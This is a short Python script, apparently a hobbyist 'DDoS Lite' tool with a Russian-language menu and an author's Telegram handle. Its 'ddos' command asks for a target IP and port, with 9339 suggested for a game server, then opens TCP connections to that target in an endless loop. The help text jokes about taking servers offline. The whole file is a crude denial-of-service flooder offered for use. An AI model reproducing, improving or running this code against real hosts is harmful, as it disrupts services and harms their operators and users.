import socket
from time import sleep
import os

while True:
			run = 666
			while run != 1:
				os.system('cls' if os.name == 'nt' else 'clear')
				print("""
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

██╗░░░░░██╗████████╗███████╗
██║░░░░░██║╚══██╔══╝██╔════╝
██║░░░░░██║░░░██║░░░█████╗░░
██║░░░░░██║░░░██║░░░██╔══╝░░
███████╗██║░░░██║░░░███████╗
╚══════╝╚═╝░░░╚═╝░░░╚══════╝
by AmokDev

******************
Команды
Помощь - help
Ддос - ddos
******************
""")
				word = input('>>> ')
				if word == "ddos" or word == "help":
					run = 1
				else:
					print('[x] Неизвестная команда')
					sleep(0.60)

			if word == 'ddos':
				sleep(1)
				ip = input("Введите ip адрес: ")
				port = int(input("Введите порт (для BS 9339): "))
				while True:
					socket.socket().connect((ip, port))
					print("Ddos: " + ip)

			if word == 'help':
				print("""
TG: @dummy_news
CREATOR: @amok_golub (если есть ошибки, пишите мне в лс или в чате! если у вас спам бан, вам поможет ссылка ниже!)


*******************************************************************
Error[110] - время соединения истекло
Error[111] - сервер выключен (возможно этому посопутствовали вы :>)
Error[7] - неверный port или ip адрес

Остальных ошибок не видел :D
*******************************************************************
""")
				input('\n[*] Для продолжения нажмите ENTER')